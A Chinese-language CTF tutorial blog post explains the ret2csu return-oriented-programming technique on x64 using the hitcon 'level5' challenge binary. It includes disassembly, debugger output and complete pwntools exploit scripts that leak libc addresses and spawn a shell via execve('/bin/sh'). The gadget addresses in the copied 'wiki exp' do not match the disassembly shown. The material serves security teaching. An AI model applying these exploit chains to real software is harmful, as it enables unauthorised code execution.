---
title: Ret2csu
date: 2021-02-10
tags: PWN
categories: Technology
---


# ret2csu

## 原理

x64中，函数的前6个参数是通过寄存器传参的（ 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9），但是大多数情况下，我们很难找到每个寄存器对应的gadgets。这时，我们可以利用x64下的\_libc\_csu\_init中的gadgets。这个函数时用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定存在。不同版本的这个函数有一定的区别。先来看一下这个函数

```assembly
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

在这里我们可以利用以下几点：

- 从0x40061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx，rbp，r12，r13，r14，r15寄存器

- 从0x400600到0x400609，可以将r13赋值给rdx，将r14赋值给rsi，将r15赋值给edi（虽然这里赋值给edi，但其实此时rdi的高32位寄存器为0，所以我们其实只能控制低32位），而上述的3个寄存器其实就是x64函数调用时用到的前三个寄存器。**此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数**，比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址

  ```assembly
  .text:0000000000400609                 call    qword ptr [r12+rbx*8]
  ```

- 从0x40060D到0x400614，可以控制rbx与rbp之间的关系为：rbx + 1 = rbp，这样就不会执行loc_400600，进而执行下面的汇编代码，这里我们可以简单的设置rbx=0，rbp=1。

## 示例

下面要用到的示例文件地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5

源自蒸米的一步一步学 ROP 之 linux_x64 篇中 level5。

首先看下保护：

```c
yutao@pwnbaby:~/Desktop/hitcon-level5$ checksec level5
[*] '/home/yutao/Desktop/hitcon-level5/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

64位，开了堆栈不可执行。

发现了一个栈溢出的函数：

```c
ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]
  return read(0, &buf, 0x200uLL);
}
```

```assembly
pwndbg> stack 24
00:0000│ rsp  0x7fffffffdec8 —▸ 0x400584 (vulnerable_function+30) ◂— nop    
01:0008│ rsi  0x7fffffffded0 ◂— '12345678\n'
02:0010│      0x7fffffffded8 ◂— 0xa /* '\n' */
03:0018│      0x7fffffffdee0 ◂— 0x0
... ↓
09:0048│      0x7fffffffdf10 ◂— 9 /* '\t' */
0a:0050│      0x7fffffffdf18 —▸ 0x7ffff7dd5660 (dl_main) ◂— push   rbp
0b:0058│      0x7fffffffdf20 —▸ 0x7fffffffdf88 —▸ 0x7fffffffe058 —▸ 0x7fffffffe386 ◂— '/home/yutao/Desktop/hitcon-level5/level5'
0c:0060│      0x7fffffffdf28 ◂— 0x1
... ↓
0e:0070│      0x7fffffffdf38 —▸ 0x40060d (__libc_csu_init+77) ◂— add    rbx, 1
0f:0078│      0x7fffffffdf40 ◂— 0x0
10:0080│      0x7fffffffdf48 —▸ 0x7ffff7ffe170 ◂— 0x0
11:0088│ rbp  0x7fffffffdf50 —▸ 0x7fffffffdf70 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
12:0090│      0x7fffffffdf58 —▸ 0x4005b4 (main+45) ◂— mov    eax, 0
13:0098│      0x7fffffffdf60 —▸ 0x7fffffffe058 —▸ 0x7fffffffe386 ◂— '/home/yutao/Desktop/hitcon-level5/level5'
14:00a0│      0x7fffffffdf68 ◂— 0x100000000
15:00a8│      0x7fffffffdf70 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
16:00b0│      0x7fffffffdf78 —▸ 0x7ffff7a03bf7 (__libc_start_main+231) ◂— mov    edi, eax
17:00b8│      0x7fffffffdf80 ◂— 0x2000000000
pwndbg> 

```

可以看出动态调出来的栈偏移与IDA中的0x80是相同的。此外，在IDA中可以发现并没有system函数，也没有/bin/sh字符串，所以只能用libc泄露函数地址来进行利用。这里选择用write函数来利用，打印出write_got函数的地址，再去寻找相对应的libc，当然也可以选用__libc_start_main来利用。

```got
pwndbg> got

/home/yutao/Desktop/hitcon-level5/level5:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5
0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000601028 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
```

寻找write函数在内存中的真实地址：

```python
from pwn import *

p = process('./level5')
elf = ELF('level5')

pop_addr = 0x40061a          
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']

p.recvuntil('Hello, World\n')
payload0 = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + 'a'*(0x8+8*6) + p64(main_addr)
#                                        rbx    rbp        call:r12     r13->rdx     r14->rsi     r15->edi        
p.sendline(payload0)

write_start = u64(p.recv(8))
print "write_addr_in_memory_is "+hex(write_start)
```

发生溢出后，覆盖返回地址，之后push各种东西，再之后覆盖返回地址为mov_addr的地址：

```assembly
.text:000000000040061A                 pop     rbx  //rbx->0
.text:000000000040061B                 pop     rbp  //rbp->1
.text:000000000040061C                 pop     r12  //r12->write_got函数地址
.text:000000000040061E                 pop     r13  //r13->8
.text:0000000000400620                 pop     r14  //r14->write_got函数地址
.text:0000000000400622                 pop     r15  //r15->1
.text:0000000000400624                 retn         //覆盖为mov_addr
```

wiki上的exp：

```python
from pwn import *
from LibcSearcher import *

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write'] 		#获取write函数的got地址
read_got = level5.got['read']				#获取read函数的got地址
main_addr = level5.symbols['main']  #获取main函数的函数地址
bss_base = level5.bss()							#获取bss段地址
csu_front_gadget = 0x00000000004005F0 
#_libc_csu_init函数中位置靠前的gadget，即向rdi、rsi、rdx寄存器mov的gadget
csu_behind_gadget = 0x0000000000400606
#_libc_csu_init函数中位置靠后的gadget，即pop rbx、rbp、r12、r13、r14、r15寄存器的gadget

#自定义csu函数，方便每一次构造payload
def csu(fill, rbx, rbp, r12, r13, r14, r15, main):
  #fill为填充sp指针偏移造成8字节空缺
  #rbx, rbp, r12, r13, r14, r15皆为pop参数
  #main为main函数地址
    payload = 'a' * 136 			#0x80+8个字节填满栈空间至ret返回指令
    payload += p64(csu_behind_gadget) 
    payload += p64(fill) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_gadget)
    payload += 'a' * 56      #0x38个字节填充平衡堆栈造成的空缺
    payload += p64(main)
    sh.send(payload)    #发送payload
    sleep(1)						#暂停等待接收

sh.recvuntil('Hello, World\n')
#write函数布局打印write函数地址并返回main函数
csu(0,0, 1, write_got, 1, write_got, 8, main_addr)

write_addr = u64(sh.recv(8))    #接收write函数地址
libc = LibcSearcher('write', write_addr)	#LibcSearcher查找libc版本
libc_base = write_addr - libc.dump('write') #计算该版本libc基地址
execve_addr = libc_base + libc.dump('execve') #查找该版本libc execve函数地址
log.success('execve_addr ' + hex(execve_addr))

sh.recvuntil('Hello, World\n')
#read函数布局，将execve函数地址和/bin/sh字符串写进bss段首地址
csu(0,0, 1, read_got, 0, bss_base, 16, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
#调用bss段中的execve('/bin/sh')
csu(0,0, 1, bss_base, bss_base+8, 0, 0, main_addr)
sh.interactive()

```

